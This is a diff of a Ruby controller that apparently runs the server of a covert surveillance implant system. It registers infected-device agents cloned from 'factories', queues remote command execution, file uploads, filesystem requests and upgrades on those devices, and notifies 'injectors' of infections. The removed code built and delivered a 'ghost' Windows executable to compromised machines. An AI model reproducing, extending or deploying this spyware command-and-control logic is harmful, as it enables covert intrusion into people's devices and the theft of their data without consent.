@@ -23,7 +23,7 @@ class AgentController < RESTController
 
     mongoid_query do
       db = Mongoid.database
-      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size", "stat.ghost"])
+      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size"])
       ok(j)
     end
   end
@@ -35,7 +35,7 @@ class AgentController < RESTController
 
     mongoid_query do
       db = Mongoid.database
-      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "version", "counter", "configs"])
+      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "good", "version", "counter", "configs"])
 
       agent = j.first
 
@@ -117,25 +117,30 @@ class AgentController < RESTController
   
   def create
     require_auth_level :tech
+    require_auth_level :tech_factories
 
-    # to create a target, we need to owning operation
+    # need a path to put the factory
     return bad_request('INVALID_OPERATION') unless @params.has_key? 'operation'
-    return bad_request('INVALID_TARGET') unless @params.has_key? 'target'
 
     mongoid_query do
 
       operation = ::Item.operations.find(@params['operation'])
       return bad_request('INVALID_OPERATION') if operation.nil?
 
-      target = ::Item.targets.find(@params['target'])
-      return bad_request('INVALID_TARGET') if target.nil?
+      if @params['target'].nil?
+        target = nil
+      else
+        target = ::Item.targets.find(@params['target'])
+        return bad_request('INVALID_TARGET') if target.nil?
+      end
 
       # used to generate log/conf keys and seed
       alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'
 
       item = Item.create!(desc: @params['desc']) do |doc|
         doc[:_kind] = :factory
-        doc[:path] = [operation._id, target._id]
+        doc[:path] = [operation._id]
+        doc[:path] << target._id unless target.nil?
         doc[:status] = :open
         doc[:type] = @params['type']
         doc[:ident] = get_new_ident
@@ -160,12 +165,12 @@ class AgentController < RESTController
       Audit.log :actor => @session[:user][:name],
                 :action => "factory.create",
                 :operation_name => operation['name'],
-                :target_name => target['name'],
+                :target_name => target ? target['name'] : '',
                 :agent_name => item['name'],
                 :desc => "Created factory '#{item['name']}'"
 
       item = Item.factories
-        .only(:name, :desc, :status, :_kind, :path, :ident, :type, :counter, :configs)
+        .only(:name, :desc, :status, :_kind, :path, :ident, :type, :counter, :configs, :good)
         .find(item._id)
 
       ok(item)
@@ -201,7 +206,8 @@ class AgentController < RESTController
 
   def add_config
     require_auth_level :tech
-    
+    require_auth_level :tech_config
+
     mongoid_query do
       agent = Item.any_in(_id: @session[:accessible]).find(@params['_id'])
 
@@ -238,6 +244,7 @@ class AgentController < RESTController
 
   def update_config
     require_auth_level :tech
+    require_auth_level :tech_config
 
     mongoid_query do
       agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
@@ -252,6 +259,7 @@ class AgentController < RESTController
 
   def del_config
     require_auth_level :tech
+    require_auth_level :tech_config
 
     mongoid_query do
       agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
@@ -314,7 +322,7 @@ class AgentController < RESTController
 
     # yes it is, return the status
     unless agent.nil?
-      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{scout})"
+      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{scout}, good: #{agent[:good]})"
 
       # if the agent was queued, but now we have a license, use it and set the status to open
       # a demo agent will never be queued
@@ -338,7 +346,7 @@ class AgentController < RESTController
         agent.save
       end
 
-      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
+      status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id], :good => agent[:good]}
       return ok(status)
     end
 
@@ -348,6 +356,9 @@ class AgentController < RESTController
     # the status of the factory must be open otherwise no instance can be cloned from it
     return not_found("Factory not found: #{@params['ident']}") if factory.nil?
 
+    # the status of the factory must be open otherwise no instance can be cloned from it
+    return not_found("Factory is marked as compromised found: #{@params['ident']}") unless factory.good
+
     # increment the instance counter for the factory
     factory[:counter] += 1
     factory.save
@@ -356,6 +367,28 @@ class AgentController < RESTController
 
     # clone the new instance from the factory
     agent = factory.clone_instance
+
+    # check where the factory is:
+    # if inside a target, just create the instance
+    # if inside an operation, we have to create a target for each instance
+    parent = Item.find(factory.path.last)
+
+    if parent[:_kind] == 'target'
+      agent.path = factory.path
+    elsif parent[:_kind] == 'operation'
+      target = Item.create(name: agent.name) do |doc|
+        doc[:_kind] = :target
+        doc[:path] = factory.path
+        doc.stat = ::Stat.new
+        doc[:status] = :open
+        doc[:desc] = "Created automatically on first sync from: #{agent.name}"
+      end
+
+      # make the target accessible to the users
+      SessionManager.instance.add_accessible_item(factory, target)
+
+      agent.path = factory.path << target._id
+    end
 
     # specialize it with the platform and the unique instance
     agent.platform = platform
@@ -387,7 +420,7 @@ class AgentController < RESTController
     end
 
     # add the new agent to all the accessible list of all users
-    SessionManager.instance.add_accessible_agent(factory, agent)
+    SessionManager.instance.add_accessible_item(factory, agent)
 
     # check for alerts on this new instance
     Alerting.new_instance agent
@@ -395,7 +428,7 @@ class AgentController < RESTController
     # notify the injectors of the infection
     ::Injector.all.each {|p| p.disable_on_sync(factory)}
 
-    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
+    status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id], :good => agent[:good]}
     return ok(status)
   end
 
@@ -424,7 +457,7 @@ class AgentController < RESTController
     return not_found("Agent not found: #{@params['_id']}") if agent.nil?
 
     # don't send the config to agent too old
-    if (agent.platform == 'blackberry' or agent.platform == 'android')
+    if agent.platform == 'blackberry' or agent.platform == 'android'
       if agent.version < 2012013101
         trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
         return not_found
@@ -459,13 +492,6 @@ class AgentController < RESTController
         config.sent = Time.now.getutc.to_i if config.sent.nil? or config.sent == 0
         config.activated = Time.now.getutc.to_i
         config.save
-
-        # remove the ghost after activating it
-        if config.is_ghost_present?
-          agent.configs.create!(config: config.config)
-          config = agent.configs.last
-          config.remove_ghost
-        end
 
         trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
     end
@@ -503,6 +529,10 @@ class AgentController < RESTController
           trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
           return ok(content.read, {content_type: content.content_type})
         when 'POST'
+          require_auth_level :tech_upload
+
+          return conflict('NO_UPLOAD') unless LicenseManager.instance.check :modify
+
           upl = @params['upload']
           file = @params['upload'].delete 'file'
           upl['_grid'] = [ GridFS.put(File.open(Config.instance.temp(file), 'rb+') {|f| f.read}, {filename: upl['filename']}) ]
@@ -522,6 +552,7 @@ class AgentController < RESTController
   # fucking flex that does not support the DELETE http method
   def upload_destroy
     require_auth_level :tech
+    require_auth_level :tech_upload
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
@@ -556,9 +587,12 @@ class AgentController < RESTController
           trace :debug, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
           return ok(content.read, {content_type: content.content_type})
         when 'POST'
+          require_auth_level :tech_build
+
           Audit.log :actor => @session[:user][:name], :action => "agent.upgrade", :desc => "Requested an upgrade for agent '#{agent['name']}'"
-          trace :info, "Agent #{agent.name} scheduled for upgrade"
+          trace :info, "Agent #{agent.name} request for upgrade"
           agent.upgrade!
+          trace :info, "Agent #{agent.name} scheduled for upgrade"
         when 'DELETE'
           agent.upgrade_requests.destroy_all
           agent.upgradable = false
@@ -616,7 +650,7 @@ class AgentController < RESTController
 
   # retrieve the list of filesystem for a given agent
   def filesystems
-    require_auth_level :server, :tech, :view
+    require_auth_level :server, :view
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
@@ -627,7 +661,7 @@ class AgentController < RESTController
   end
   
   def filesystem
-    require_auth_level :server, :tech, :view
+    require_auth_level :server, :view
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
@@ -636,6 +670,7 @@ class AgentController < RESTController
 
       case @request[:method]
         when 'POST'
+          require_auth_level :view_filesystem
 
           if @params['filesystem']['path'] == 'default'
             agent.add_default_filesystem_requests
@@ -656,7 +691,8 @@ class AgentController < RESTController
 
   # fucking flex that does not support the DELETE http method
   def filesystem_destroy
-    require_auth_level :tech, :view
+    require_auth_level :view
+    require_auth_level :view_filesystem
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
@@ -712,6 +748,10 @@ class AgentController < RESTController
           list = agent.exec_requests
           return ok(list)
         when 'POST'
+          require_auth_level :tech_exec
+
+          return conflict('NO_EXEC') unless LicenseManager.instance.check :modify
+
           agent.exec_requests.create(@params['exec'])
           trace :info, "[#{@request[:peer]}] Added download request #{@params['exec']}"
           Audit.log :actor => @session[:user][:name], :action => "agent.exec", :desc => "Added a command execution request for agent '#{agent['name']}'"
@@ -727,6 +767,7 @@ class AgentController < RESTController
   # fucking flex that does not support the DELETE http method
   def exec_destroy
     require_auth_level :tech
+    require_auth_level :tech_exec
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
@@ -734,73 +775,6 @@ class AgentController < RESTController
       Audit.log :actor => @session[:user][:name], :action => "agent.exec", :desc => "Removed a command execution request for agent '#{agent['name']}'"
       return ok
     end
-  end
-
-  def ghost
-    require_auth_level :server
-
-    ident, instance = @params['_id'].split('-')
-
-    mongoid_query do
-      agent = Item.where({_kind: 'agent', ident: ident, instance: Regexp.new(instance.prepend('^'))}).first
-
-      return if agent.nil?
-      trace :info, "[#{@request[:peer]}] Ghost Agent request for #{agent.ident} #{agent.instance}"
-
-      # update the stats
-      agent.stat[:last_sync] = Time.now.getutc.to_i
-      agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_GHOST
-      agent.stat[:ghost] = true
-      agent.save
-
-      file = "#{agent.ident}:#{agent.instance}.exe"
-
-      return not_found() unless File.exist? Config.instance.temp(file)
-
-      content = File.binread(Config.instance.temp(file))
-      FileUtils.rm_rf Config.instance.temp(file)
-
-      trace :info, "[#{@request[:peer]}] Ghost Agent sent: #{file} (#{content.bytesize} bytes)"
-
-      return ok(content, {content_type: 'binary/octetstream'})
-    end
-  end
-
-  def activate_ghost
-    require_auth_level :tech
-
-    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
-
-    trace :info, "[#{@request[:peer]}] Activating Ghost Agent for #{agent.name}"
-
-    factory = ::Item.where({_kind: 'factory', ident: agent.ident}).first
-    build = RCS::DB::Build.factory(:windows)
-    build.load({'_id' => factory._id})
-    build.unpack
-
-    sync = @params['sync']
-    id = agent.ident.slice(4..-1).to_i
-    instance = agent.instance.slice(0..7).to_i(16)
-
-    build.ghost({:sync => sync, :build => id, :instance => instance})
-
-    # add the upload to the agent
-    agent.upload_requests.destroy_all
-    content = File.open(File.join(build.tmpdir, 'ghost'), 'rb+') {|f| f.read}
-    agent.upload_requests.create!({filename: 'ghits', _grid: [RCS::DB::GridFS.put(content, {filename: 'ghits', content_type: 'application/octet-stream'})] })
-
-    build.clean
-
-    # duplicate the current config
-    config = agent.configs.last
-    agent.configs.create!(config: config.config)
-
-    # get the duplicated and add the ghost
-    config = agent.configs.last
-    config.user = @session[:user][:name]
-    config.add_ghost
-
-    return ok()
   end
 
 end
